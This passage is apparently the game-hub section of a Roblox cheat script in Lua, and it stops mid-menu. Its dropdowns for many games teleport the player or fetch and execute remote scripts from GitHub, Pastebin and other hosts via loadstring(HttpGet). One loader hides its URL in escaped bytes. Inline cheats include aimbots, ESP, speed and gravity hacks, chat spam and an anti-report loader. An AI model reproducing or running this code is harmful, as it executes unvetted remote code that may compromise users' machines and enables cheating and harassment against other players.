GameHubTab:AddDropdown({
	Name = "Anime Fighters Simulator",
	Default = "None",
	Options = {
	  "None", 
	  "Click to join",
	  "1"
	},
	Callback = function(Value)
		if Value == "None" then
		  print("")
		elseif Value == "Click to join" then
		  game:GetService("TeleportService"):Teleport(6299805723, game.Players.LocalPlayer)
		elseif Value == "1" then
		 loadstring(game:HttpGet(('https://raw.githubusercontent.com/pspboy08/dollhouse/main/AFSGUI.lua')))()
		end
	end    
})

GameHubTab:AddDropdown({
	Name = "Apocalypse Rising 2",
	Default = "None",
	Options = {
	  "None", 
	  "Click to join",
	  "Open Aimbot",
	  "TP Walk"
	},
	Callback = function(Value)
		if Value == "None" then
		  print("")
		elseif Value == "Click to join" then
		  game:GetService("TeleportService"):Teleport(863266079, game.Players.LocalPlayer)
		elseif Value == "Open Aimbot" then
		 loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/Open-Aimbot/master/source.lua", true))()
		elseif Value == "TP Walk" then
	   getgenv().TpWalking = true
		getgenv().Speed = 4.5
		local speaker = game:GetService("Players").LocalPlayer
		local chr = speaker.Character
		local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
		local hb = game:GetService("RunService").Heartbeat
		while getgenv().TpWalking and chr and hum and hum.Parent do
			local delta = hb:Wait()
			if hum.MoveDirection.Magnitude > 0 then
				chr:TranslateBy(hum.MoveDirection * tonumber(getgenv().Speed) * delta * 10)
			else
				chr:TranslateBy(hum.MoveDirection * delta * 10)
			end
		end
		end
	end    
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
}) --- B
--[] Seperator

GameHubTab:AddDropdown({
	Name = "Booga Booga [REBORN]",
	Options = {
		"None",
		"Click to Join Booga Booga [REBORN]",
		"Nil | HUB",
		"Slideurs | HUB",
		"Devil | HUB",
		"Booga Booga | HUB"
	},
	Callback = function(option)
		if option == "Click to Join Booga Booga [REBORN]" then
			game:GetService("TeleportService"):Teleport(11729688377, game.Players.LocalPlayer)
		elseif option == "Nil | HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Texchy/Nilhub/main/NilhubFree.lua"))()
		elseif option == "Slideurs | HUB" then
			loadstring(game:HttpGet('https://raw.githubusercontent.com/boogauser3533/natsuloader/main/SlideursHub-Loader.lua'))()
		elseif option == "Devil | HUB" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/DEVIL-Script/DEVIL-Hub/main/DEVIL-Hub-Main", true))()
		elseif option == "Booga Booga | HUB" then
			getgenv().TSSettings = {
				key = "robloxscripts.com", 
				Style = 1,
				SizeX = 500,
				SizeY = 350,
				Theme = "Light", 
				MainFrame = Color3.fromRGB(0, 0, 0), 
			}
			local function import(url)
				local formattedurl = loadstring(game:HttpGet('https://raw.githubusercontent.com/lazywarew/Script/'..url))()
			end
			import("/main/loadermain.lua")
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Baddies",
	Options = {
		"None",
		"Click to Join Baddies",
		"1"
	},
	Callback = function(option)
		if option == "Click to Join Baddies" then
			game:GetService("TeleportService"):Teleport(11158043705, game.Players.LocalPlayer)
		elseif option == "1" then
			loadstring(game:HttpGet(("https://pastebin.com/raw/mT10xnt7"), true))()
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Backroom Race Clicker",
	Options = {
		"None",
		"Click to Join Backroom Race Clicker",
		"1"
	},
	Callback = function(option)
		if option == "Click to Join Backroom Race Clicker" then
			game:GetService("TeleportService"):Teleport(9649680488, game.Players.LocalPlayer)
		elseif option == "1" then
			function TeleWorld(SeWorld)
				if game:GetService("Workspace").Racetracks:FindFirstChild(SeWorld) then
					TPTo(game:GetService("Workspace").Racetracks[SeWorld].Doors.ElevatorSounds.CFrame)
				end
			end
		 
			local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()
		 
			local w = library:CreateWindow("Backrooms Race Clicker")
		 
			local b = w:CreateFolder("Backrooms Race Clicker")
		 
			b:Button("Get Max Speed",function()
				game:GetService('Players').LocalPlayer.Character.Humanoid.WalkSpeed = 99999999999999999
			end)
			local SRace
			b:Dropdown("Race",{"Normal","Hard","Impossible","Godlike",},true,function(val)
				SRace = val;
			end)
		 
			b:Button("TP",function()
			if SRace then
				TeleWorld(SRace)
			end
			end)
		 
			local w = library:CreateWindow("Others")
		 
			local S
			local J
			local H
			local G
			local C
			local CF
		 
			local b = w:CreateFolder("LocalPlayer")
		 
			b:Box("Speed","number",function(val)
			S = val
			end)
			b:Box("Jump","number",function(val)
			J = val
			end)
			b:Box("Hip Height","number",function(val)
			H = val
			end)
			b:Box("Gravity","number",function(val)
			G = val
			end)
		 
			b:Toggle("Speed",function(bool)
			getgenv().Speed = bool
			Speed(S)
			end)
			b:Toggle("Jump",function(bool)
			getgenv().Jump = bool
			Jump(J)
			end)
			b:Toggle("Hip Height",function(bool)
			getgenv().Hip = bool
			Hip(H)
			end)
			b:Toggle("Gravity",function(bool)
			getgenv().Grav = bool
			Grav(G)
			end)
		 
			b:Slider("FOV (Default is 70)",{min = 0;max = 120;precise = true;},function(val)
				game.workspace.CurrentCamera.FieldOfView = val
				end)
		 
			b:Button("Print Current XYZ",function()
			function GetPOS() return game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame end print(GetPOS())
			end)
		 
			local b = w:CreateFolder("Stuff")
		 
			b:Box("Chat","Message",function(val)
				C = val
			end)
		 
			b:Box("Cooldown","Speed",function(val)
				CF = val
			end)
		 
			b:Toggle("Spam",function(bool)
				getgenv().Chat = bool
				Chat(C, CF)
			end)
		 
			b:Button("Rejoin",function()
				loadstring(game:HttpGet("https://pastebin.com/raw/mM7JBG5h", true))()
			end)
		 
			b:Button("Giant",function()
				loadstring(game:HttpGet("https://pastebin.com/raw/2jnKKARG", true))()
			end)
		 
			b:Button("Noclip",function()
				loadstring(game:HttpGet("https://pastebin.com/raw/hd03Vdwm", true))()
			end)
		 
			b:Button("Reset",function()
				loadstring(game:HttpGet("https://pastebin.com/raw/EEY6SATj", true))()
			end)
		 
			b:Button("RTX Summer",function()
				loadstring(game:HttpGet("https://paste.ee/r/h4fL2", true))()
			end)
		 
			b:Button("RTX Autumn",function()
				loadstring(game:HttpGet("https://paste.ee/r/9eV0M", true))()
			end)
		 
			b:Button("Anti-Report",function()
				loadstring(game:HttpGet("https://paste.ee/r/GphmF", true))()
			end)
		 
			local b = w:CreateFolder("Credits")
		 
			b:Label("Made by X_LuaF#0705",{
				TextSize = 21;
				TextColor = Color3.fromRGB(255,255,255);
				BgColor = Color3.fromRGB(69,69,69);
			})
		 
			b:Button("Copy Discord Invite",function()
				setclipboard("https://discord.gg/8tRb8MQcW5")
			end)
		 
			b:DestroyGui()
		 
			getgenv().Speed = false;
			getgenv().Jump = false;
			getgenv().Hip = false;
			getgenv().Chat = false;
			getgenv().Grav = false;
		 
			function Chat(Mes, Freq)
				spawn(function ()
					while getgenv().Chat == true do
			local args = {[1] = Mes,[2] = "All"} game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait(Freq)
					end
				end)
			end
		 
			function Speed(Nume)
				spawn(function ()
					if getgenv().Speed == true then
						while getgenv().Speed == true do
							game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = Nume
							wait()
						end
					elseif getgenv().Speed == false then
						game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = 16
					end
				end)
			end
			function Jump(Nume)
				spawn(function ()
					if getgenv().Jump == true then
						while getgenv().Jump == true do
							game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = Nume
							wait()
					end
				elseif getgenv().Jump == false then
						game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = 50
					end
				end)
			end
			function Hip(Nume)
				spawn(function ()
					if getgenv().Hip == true then
						while getgenv().Hip == true do
						game:GetService("Players").LocalPlayer.Character.Humanoid.HipHeight = Nume
						wait()
					end
				elseif getgenv().Hip == false then
						game:GetService("Players").LocalPlayer.Character.Humanoid.HipHeight = 0.1
					end
				end)
			end
			function Grav(Nume)
				spawn(function ()
					if getgenv().Grav == true then
						while getgenv().Grav == true do
							game:GetService("Workspace").Gravity = Nume
						wait()
					end
				elseif getgenv().Grav == false then
					game:GetService("Workspace").Gravity = 196.2
					end
				end)
			end
		 
			function TPTo(PCFrame)
				local plr = game.Players.LocalPlayer;
					   if plr.Character then
						plr.Character.HumanoidRootPart.CFrame = PCFrame
					end
				end
		end
	end
})

GameHubTab:AddDropdown({
	Name = "Blade Ball",
	Default = "None",
	Options = {
	  "None", 
	  "Click to join",
	  "FFJ",
	  "Infinix HUB",
	  "Ether HUB",
	  "Nurysium HUB",
	  "SumitScripts HUB",
	  "Schema HUB",
	  "Zygarde HUB",
	  "Zap HUB",
	  "Bedol HUB",
	  "Pitbull HUB",
	  "Visual HUB",
	  "Plutonium HUB",
	  "Nexam HUB",
	  "Key : Triple HUB",
	  "Triple HUB",
	  "1"
	},
	Callback = function(Value)
		if Value == "None" then
		  print("")
		elseif Value == "Click to join" then
		  game:GetService("TeleportService"):Teleport(13772394625, game.Players.LocalPlayer)
		elseif Value == "FFJ HUB" then
		 loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/BladeBallV3.lua"))()
		elseif Value == "Infinix HUB" then
		  loadstring(game:HttpGet("https://github.com/Hosvile/InfiniX/releases/latest/download/main.lua", true))
		elseif Value == "Ether HUB" then
		 loadstring(game:HttpGet("https://raw.githubusercontent.com/6w0s/_6w0s/main/Loader.lua"))()
		 elseif Value == "Nurysium HUB" then
		  loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1f9bc8752e71c108f3a9d219a5239a59.lua"))() 
		elseif Value == "SumitScripts HUB" then
		 loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/BladeBallV3.lua"))()
		elseif Value == "Schema HUB" then
	   loadstring(game:HttpGet("https://raw.githubusercontent.com/manimanni/Schema/main/posse.lua"))()
		elseif Value == "Zygarde" then
		 loadstring(game:HttpGet("https://raw.githubusercontent.com/louismich4el/Zygarde/main/Protected%20zygarde.lua"))()
		elseif Value == "Zap HUB" then
		 loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
		elseif Value == "Bedol HUB" then
	   local _,er_msg = pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/New-C4-Remote.lua/main/BetaTest/Bladeball15m.html")))
		elseif Value == "Pitbull HUB" then
		 loadstring(game:HttpGet("https://raw.githubusercontent.com/SoyAdriYT/PitbullHub--/main/Destroyer", true))()
		 elseif Value == "Visual HUB" then
		 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a5945467f3b9388503ca653c0ea49cba.lua"))()
		elseif Value == "Plutonium HUB" then
	   loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
		elseif Value == "Nexam HUB" then
		 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5ebefab5c68bfa67271dcbf6430d3c7d.lua"))()
		elseif Value == "Key : Triple Hub" then
		  print("")
		elseif Value == "Triple HUB" then
	   loadstring(game:HttpGet("https://raw.githubusercontent.com/TripleScript/TripleHub/main/TripleHubV2.txt"))()
		elseif Value == "1" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/SethProYT/boxing-league-script/main/script"))()
		end
	end    
})

GameHubTab:AddDropdown({
    Name = "Bedwars",
    Default = "None",
    Options = {
        "None",
        "Click to Join",
        "Vape V4 HUB",
        "Rise HUB",
        "Autumn HUB",
        "Aeolus V2 HUB",
        "Godsploit HUB",
        "Alsploit HUB",
        "CocoSkid HUB",
        "CocoPaste HUB",
        "Aristois HUB",
        "Snyware HUB",
        "Aether Client HUB",
        "Polaris HUB",
        "CoCosploit HUB",
        "CoCosploit V2 HUB",
        "Autumn HUB",
        "Icecat V2 HUB",
        "Icecat V4 HUB",
        "Oxygen HUB",
        "Flame X V2 HUB",
        "Ghostware HUB",
        "Oxygen HUB 2"
    },
    Callback = function(Value)
        if Value == "None" then
            print("")
        elseif Value == "Click to Join" then
            game:GetService("TeleportService"):Teleport(6872265039, game.Players.LocalPlayer)
        elseif Value == "Vape V4 HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
        elseif Value == "Rise HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/RiseForRoblox/main/main.lua", true))()
        elseif Value == "Autumn HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/0x0xLol/Autumn/main/MainScript.lua", true))()
        elseif Value == "Aeolus V2 HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ohmygodiloveketamine/aeolusv2/main/script", true))()
        elseif Value == "Godsploit HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/AlSploit/AlSploit/main/MainScript",true))()
        elseif Value == "Alsploit HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/AlSploit/AlSploit/main/AlSploit/Bedwars/Loader.lua",true))()
        elseif Value == "CocoSkid HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/QP-Community/Roblox/main/CoCoSkid"))()
        elseif Value == "CocoPaste HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/QP-Community/Roblox/main/CoCoPaste"))()
        elseif Value == "Aristois HUB" then
            shared.ReadFile = true
            pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/XzynAstralz/Aristois/main/NewMainScript.lua'))() end)
        elseif Value == "Snyware HUB" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/AFGCLIENT/Snyware/main/Loader'))()
        elseif Value == "Aether Client HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/CakScripts/AetherClientBW/main/MainScript"))()
        elseif Value == "Polaris HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/RunAccount1/PolarisRewrite/main/TempMainScript.lua", true))()
        elseif Value == "CoCosploit HUB" then
            loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\99\111\99\111\116\118\54\54\54\47\67\111\99\111\95\99\111\99\111\115\112\108\111\105\116\95\115\111\108\97\114\97\47\109\97\105\110\47\99\111\99\111\115\112\108\111\105\116\95\115\111\108\97\114\97\34\41\41\40\41\10")()
        elseif Value == "CoCosploit V2" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/cocotv666/CocoSploit_Solara/main/CocoSploit_Solara_Version_Loader"))()
        elseif Value == "Autumn HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/0x0xLol/Autumn/main/MainScript.lua", true))()
        elseif Value == "Icecat V2 HUB" then
            loadstring(game:HttpGet(('https://github.com/Baconontop/bedwarsV2/raw/main/IcecatBedwars'),true))()
        elseif Value == "Icecat V4 HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Baconontop/V4/main/Bedwars"))()
        elseif Value == "Oxygen HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/AbsurdFacts/Oxygen/main/MainScript.lua", true))()
        elseif Value == "Flame X V2 HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/FlamingDrey/Flame-X-v2/main/Flame%20X%20Bedwars%20V2"))()
        elseif Value == "Ghostware" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/CakScripts/GhostWare/main/MainScript"))()
        elseif Value == "Oxygen HUB 2" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/AbsurdFacts/Oxygen/main/MainScript.lua", true))()
        end
    end
})

GameHubTab:AddDropdown({
    Name = "Build a Boat For Treasure",
    Default = "None",
    Options = {
        "None",
        "Click to Join",
        "Ski HUB",
        "Zeerox HUB",
        "Babft HUB",
        "1"
    },
    Callback = function(Value)
        if Value == "None" then
            print("")
        elseif Value == "Click to Join" then
            game:GetService("TeleportService"):Teleport(537413528, game.Players.LocalPlayer)
        elseif Value == "Ski HUB" then
            loadstring(game:HttpGet(("https://pastebin.com/raw/mT10xnt7"), true))()
        elseif Value == "Zeerox HUB" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua'))()
        elseif Value == "Babft HUB" then
            loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/juywvm/-Roblox-Projects-/main/babft"))()
        elseif Value == "1" then
            loadstring(game:HttpGet("https://pastebin.com/raw/0KLv0p2g"))()
        end
    end
})

GameHubTab:AddDropdown({
    Name = "Blox fruits",
    Default = "None",
    Options = {
        "None",
        "Click to Join",
        "REDz Hub",
        "Hoho HUB",
        "Min gaming HUB Key:xk06nst6bgj8a",
        "LunarX HUB",
        "Sea gate HUB",
        "Speed X HUB",
        "MinGaming HUB",
        "Vector HUB",
        "Auto Bounty HUB",
        "W-Azure HUB",
        "Chestfarm HUB",
        "Perd HUB",
        "BKHAX HUB",
        "Winter HUB V2",
        "mama HUB",
        "Fiend HUB",
        "Matsune HUB V2 Key: xk06nst6bgj8a",
        "Peat Ex HUB",
        "New Dominance HUB"
    },
    Callback = function(Value)
        if Value == "None" then
            print("")
        elseif Value == "Click to Join | Blox fruit" then
            game:GetService("TeleportService"):Teleport(2753915549, game.Players.LocalPlayer)
        elseif Value == "REDz Hub" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
        elseif Value == "Hoho HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
        elseif Value == "Min gaming HUB Key:xk06nst6bgj8a" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSupremacy/Loader.xyz/main/Pronto.yxz%20ST%20%3A%20G"))()
        elseif Value == "LunarX HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/NguyenLam2504/LunarXHubNextGeneration/main/GameShit.lua"))()
        elseif Value == "Sea gate HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSupremacy/Loader.xyz/main/NextGen"))()
        elseif Value == "Speed X HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Script-Games/main/Blox%20Fruit.lua"))()
        elseif Value == "MinGaming HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Basicallyybeta/mingane/main/MinGamingNew.lua"))()
        elseif Value == "Vector HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/AAwful/VectorHub/main/Loader.lua"))()
        elseif Value == "Auto Bounty HUB" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/vinhuchi/temp-repos/main/FreeAutoBounty.lua'))()
        elseif Value == "W-Azure HUB" then
            getgenv().Team = "Pirates"
            getgenv().AutoLoad = false
            getgenv().SlowLoadUi  = false
            getgenv().ForceUseSilentAimDashModifier = false
            getgenv().ForceUseWalkSpeedModifier = false
            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
        elseif Value == "Chestfarm HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/QP-Community/Roblox/main/ChestFarmByTbao"))()
        elseif Value == "Perd HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/PerdHub/Blosfruitscript/main/PerdLoader"))()
        elseif Value == "BKHAX" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/koonpeatch/PeatEX/master/BKHAX/BloxFruits", true))()
        elseif Value == "Winter HUB V2" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Yatsuraa/Yuri/main/Winterhub_V2.lua"))()
        elseif Value == "mama HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/MAMAhub1/Mmahub/main/README.md"))()
        elseif Value == "Fiend HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Fiend1sh/FiendMain/main/FiendMainLoader", true))()
        elseif Value == "Matsune HUB V2 Key: xk06nst6bgj8a" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSupremacy/Loader.xyz/main/Loader.Blurk%20ST%20%3A%20G"))()
        elseif Value == "Peat Ex HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/koonpeatch/PeatEX/master/BKHAX/BloxFruits", true))()
        elseif Value == "New Dominance HUB" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Script-Blox/Script/main/Dominance'))()
        end
    end
})

GameHubTab:AddDropdown({
    Name = "Bee Swarm Simulator",
    Default = "None",
    Options = {
        "None",
        "Click to Join",
        "Beecon HUB",
        "Histy HUB",
        "29"
    },
    Callback = function(Value)
        if Value == "None" then
            print("")
        elseif Value == "Click to Join" then
            game:GetService("TeleportService"):Teleport(1537690962, game.Players.LocalPlayer)
        elseif Value == "Beecon HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBossScript/BeeSwarmSim/main/BeeSwarmSim"))()
        elseif Value == "Histy HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Historia00012/HISTORIAHUB/main/BSS%20FREE"))()
        elseif Value == "29" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/29"))()
        end
    end
})

GameHubTab:AddDropdown({
    Name = "Boxing League",
    Default = "None",
    Options = {
        "None",
        "Click to Join",
        "1"
    },
    Callback = function(Value)
        if Value == "None" then
            print("")
        elseif Value == "Click to Join" then
            game:GetService("TeleportService"):Teleport(3738091713, game.Players.LocalPlayer)
        elseif Value == "1" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SethProYT/boxing-league-script/main/script"))()
        end
    end
})

GameHubTab:AddDropdown({
    Name = "Breaking Point",
    Default = "None",
    Options = {
        "None",
        "Click to Join",
        "Breaking Point GUI"
    },
    Callback = function(Value)
        if Value == "None" then
            print("")
        elseif Value == "Click to Join" then
            game:GetService("TeleportService"):Teleport(648362523, game.Players.LocalPlayer)
        elseif Value == "Breaking Point GUI" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ColdStep2/Breaking-Point-Funny-Squid-Hax/main/Breaking%20Point%20Funny%20Squid%20Hax", true))()
        end
    end
})

GameHubTab:AddDropdown({
    Name = "Bad Business",
    Default = "None",
    Options = {
        "None",
        "Click to Join Bad Business",
        "1"
    },
    Callback = function(Value)
        if Value == "None" then
            print("")
        elseif Value == "Click to Join" then
            game:GetService("TeleportService"):Teleport(3233893879, game.Players.LocalPlayer)
        elseif Value == "1" then
            local models = {}
            local localPlayer = game:GetService("Players").LocalPlayer
            local folder = Instance.new("Folder", game:GetService("CoreGui"))
            local characters = workspace:WaitForChild("Characters")

            local function setupModel(v)
                if models[v] then
                    models[v]:Destroy()
                    models[v] = nil
                end

                local found = false
                for i, k in pairs(localPlayer.PlayerGui:GetChildren()) do
                    if k.Name == "NameGui" and k.Adornee.Name == "Head" then
                        if k.Adornee.Parent == v.Body then
                            found = true
                        end
                    end
                end

                if not found then
                    local highlight = Instance.new("Highlight", folder)
                    highlight.Adornee = v
                    highlight.OutlineColor = Color3.new(255, 255, 255)
                    highlight.FillColor = Color3.new(255, 0, 0)
                    highlight.FillTransparency = 0.7
                    models[v] = highlight

                    v:GetPropertyChangedSignal("Parent"):Connect(function()
                        if v.Parent == nil then models[v]:Destroy() end
                    end)
                end
            end

            for i, v in pairs(characters:GetChildren()) do
                if v:FindFirstChild("Body") then
                    setupModel(v)
                end
            end

            characters.ChildAdded:Connect(function(model)
                task.wait(1)
                if model.Parent ~= nil and model:FindFirstChild("Body") then
                    setupModel(model)
                end
            end)
        end
    end
})

GameHubTab:AddDropdown({
    Name = "Basketball Legends",
    Default = "None",
    Options = {
        "None",
        "Click to Join",
        "OBF HUB",
        "Hold e To Auto green"
    },
    Callback = function(Value)
        if Value == "None" then
            print("")
        elseif Value == "Click to Join" then
            game:GetService("TeleportService"):Teleport(14259168147, game.Players.LocalPlayer)
        elseif Value == "OBF HUB" then
            _G.OBFHUBFREE = "2kmembersgang"
            loadstring(game:HttpGet("https://raw.githubusercontent.com/obfhub/free/main/basketmball"))()
        elseif Value == "Hold e To Auto green" then
            _G.OBFHUBFREE = "2kmembersgang"
            getgenv().config = {Time = 0.045, Size = 0.9}
            local UIS = game:GetService("UserInputService")
            local TweenService = game:GetService("TweenService")
            local Player = game:GetService("Players").LocalPlayer
            local Bar = Player.PlayerGui.Visual.Shooting.Bar
            UIS.InputBegan:Connect(function(input, gpe)
                if gpe then return end
                if input.KeyCode == Enum.KeyCode.E then
                    if Player.Character:FindFirstChild("Basketball") then
                        while UIS:IsKeyDown(Enum.KeyCode.E) do
                            Bar:GetPropertyChangedSignal("Size"):Connect(function()
                                if Bar.Size.Y.Scale > getgenv().config.Size then
                                    Bar:TweenSize(UDim2.new(1,0,1,0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, getgenv().config.Time, true)
                                    task.wait()
                                    Bar.Size = UDim2.new(1,0,1,0)
                                end
                            end)
                            task.wait()
                        end
                    end
                end
            end)
        end
    end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
})
--[] Seperator

GameHubTab:AddDropdown({
    Name = "Combat Warriors",
    Default = "None",
    Options = {
        "None",
        "Click to Join",
        "Infinix HUB",
        "Aimbot (Mobile&PC)",
        "Inf Stamina",
        "Head Hitbox",
        "Max HUB",
        "CW HUB"
    },
    Callback = function(Value)
        if Value == "None" then
            print("")
        elseif Value == "Click to Join | Combat Warriors" then
            game:GetService("TeleportService"):Teleport(4282985734, game.Players.LocalPlayer)
        elseif Value == "Infinix HUB" then
            loadstring(game:HttpGet("https://github.com/Hosvile/InfiniX/releases/latest/download/main.lua", true))()
        elseif Value == "Aimbot" then
            loadstring(game:HttpGet("https://pastebin.com/raw/utHyEcbk"))()
        elseif Value == "Inf Stamina" then
            loadstring(game:HttpGet("https://pastebin.com/raw/JgSquFDL"))()
        elseif Value == "Head Hitbox" then
            loadstring(game:HttpGet("https://pastebin.com/raw/UauTz6D4"))()
        elseif Value == "Max HUB" then
            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1d4db6a1b04aaeccf046f7c63fbad31a.lua"))()
        elseif Value == "CW HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/IsaaaKK/cwhb/main/cw.txt"))()
        end
    end
})

GameHubTab:AddDropdown({
    Name = "Counter Blox",
    Default = "None",
    Options = {
        "None",
        "Click to Join",
        "Jaran.Vip HUB",
        "Pepsi HUB",
        "Midnight.cc HUB",
        "Sirex WARE",
        "Solaris HUB",
        "1"
    },
    Callback = function(Value)
        if Value == "None" then
            print("")
        elseif Value == "Click to Join" then
            game:GetService("TeleportService"):Teleport(301549746, game.Players.LocalPlayer)
        elseif Value == "Jaran.Vip HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/fliskScript/jaran.vip/main/free.lua"))()
        elseif Value == "Pepsi HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/deaddigi/pepsi.club/main/3.0/loader.lua", true))()
        elseif Value == "Midnight.cc HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/laeraz/midnightcc/main/public.lua"))()
        elseif Value == "Sirex | WARE" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/skyteg99/Sirex_Wave_v3_free/main/Sirex_Ware_v3%20(1).txt"))()
        elseif Value == "1" then
            loadstring(game:HttpGet("https://pastebin.com/raw/vbVE6W69"))()
        elseif Value == "Solaris HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/toasty-dev/pissblox/main/solaris_bootstrapper.lua", true))()
        end
    end
})

GameHubTab:AddDropdown({
    Name = "Criminality",
    Default = "None",
    Options = {
        "None",
        "Click to Join",
        "Alternative All Features"
    },
    Callback = function(Value)
        if Value == "None" then
            print("")
        elseif Value == "Click to Join" then
            game:GetService("TeleportService"):Teleport(4588604953, game.Players.LocalPlayer)
        elseif Value == "Alternative All Features" then
            loadstring(game:HttpGet("https://scriptblox.com/raw/SUMMER-Criminality-Alternative-all-OP-features-4305"))()
        end
    end
})

GameHubTab:AddDropdown({
    Name = "Da Hood",
    Default = "None",
    Options = {
        "None",
        "Click to Join",
        "Agent HUB",
        "Ball V6 HUB",
        "Detazy HUB",
        "Aura X HUB",
        "Swag Mode HUB",
        "Pluto HUB",
        "Rise HUB",
        "CC Project HUB",
        "Sanky HUB",
        "Rubywtf HUB",
        "Rayx HUB",
        "Vortex HUB",
        "Azure V4 HUB",
        "Polakya HUB",
        "TBO HUB"
    },
    Callback = function(Value)
        if Value == "None" then
            print("")
        elseif Value == "Click to Join" then
            game:GetService("TeleportService"):Teleport(2788229376, game.Players.LocalPlayer)
        elseif Value == "Agent HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/mrhackerman35297/AgentCC/main/Launch.lua"))()
        elseif Value == "Ball V6 HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/main/DHHScript"))()
        elseif Value == "Detazy HUB" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/I4MMO/Detazy/main/Main', true))()
        elseif Value == "Aura X HUB" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/k0nkx/Aura-x-skid-ez-remake-by-k0nkx/main/Sigma"))()
        elseif Value == "Swag Mode HUB" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
        elseif Value == "Pluto HUB" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Scrvpter/Pluto/Lua/Loader.Lua', true))()
